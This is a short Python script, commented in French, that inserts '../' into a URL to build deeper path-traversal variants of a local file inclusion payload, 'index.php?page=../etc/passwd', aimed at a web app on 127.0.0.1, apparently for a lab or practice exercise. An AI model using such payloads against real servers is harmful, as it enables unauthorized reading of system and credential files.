CHARS_A_INSERER = "../"
POSITION        = 36

def modifier_chaine(chaine: str) -> str:
    return chaine[:POSITION] + CHARS_A_INSERER + chaine[POSITION:]


string = [
    "http://127.0.0.1:8080/index.php?page=../etc/passwd"
]

for s in string:
    resultat = modifier_chaine(s)
    print(f"Avant  : {s!r}")
    print(f"Après  : {resultat!r}")
    print()
